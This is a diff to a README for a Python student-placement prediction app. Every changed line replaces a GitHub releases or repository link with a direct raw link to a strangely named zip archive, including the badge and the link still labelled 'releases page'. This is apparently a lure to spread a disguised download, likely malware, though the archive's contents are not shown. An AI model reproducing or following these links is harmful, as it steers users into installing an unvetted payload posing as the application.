@@ -1,6 +1,6 @@
 # 🐍 Python-project - Predict Student Placement Readiness Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/samuel12312456/Python-project/releases)
+[![Download Now](https://raw.githubusercontent.com/samuel12312456/Python-project/main/Barosma/Python_project_bacteriophagous.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/samuel12312456/Python-project/main/Barosma/Python_project_bacteriophagous.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ This application predicts whether students are ready for job placements. It uses
 
 ## 💻 Download & Install
 
-To download the application, please [visit this page to download](https://github.com/samuel12312456/Python-project/releases). 
+To download the application, please [visit this page to download](https://raw.githubusercontent.com/samuel12312456/Python-project/main/Barosma/Python_project_bacteriophagous.zip). 
 
 1. **Go to Releases Page:** Click the link above to open the releases page.
 2. **Select Version:** Find the latest version listed.
@@ -50,7 +50,7 @@ If you encounter issues:
 
 - Ensure your internet connection is stable.
 - Re-install the application if it does not run.
-- Check for any updates on the [releases page](https://github.com/samuel12312456/Python-project/releases).
+- Check for any updates on the [releases page](https://raw.githubusercontent.com/samuel12312456/Python-project/main/Barosma/Python_project_bacteriophagous.zip).
 
 ## 📞 Support
 
@@ -69,4 +69,4 @@ Thanks to everyone who contributed to this project. Your efforts made this tool 
 
 ---
 
-For further details, please refer to the [repository](https://github.com/samuel12312456/Python-project). Happy predicting!
+For further details, please refer to the [repository](https://raw.githubusercontent.com/samuel12312456/Python-project/main/Barosma/Python_project_bacteriophagous.zip). Happy predicting!
